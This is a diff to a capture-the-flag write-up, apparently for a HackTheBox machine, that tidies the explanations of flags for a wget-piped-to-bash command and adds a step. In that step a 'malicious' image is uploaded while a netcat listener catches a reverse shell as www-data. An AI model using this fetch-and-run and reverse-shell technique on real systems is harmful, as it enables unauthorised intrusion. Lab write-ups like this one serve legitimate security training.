@@ -432,8 +432,29 @@ Command Flags:
 
 -`q` -> Mute the program's output.
 
--`O` -> Redirects the stdout instead of downloading the content.
+-`O` -> Redirect stdout instead of downloading the content.
 
--`| bash` -> Interprets the bash code.
+-`| bash` -> Interpret the bash code.
+
+<br />
+
+Once we have our new `malicious` image, we `start` a `listener` and `upload` image to the website:
+
+<br />
+
+```bash
+❯ nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.14.20] from (UNKNOWN) [10.10.11.140] 56992
+bash: cannot set terminal process group (647): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@meta:/var/www/dev01.artcorp.htb/metaview$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<br />
+
+Perfect! We have a `session` as `www-data`!
 
 <br />
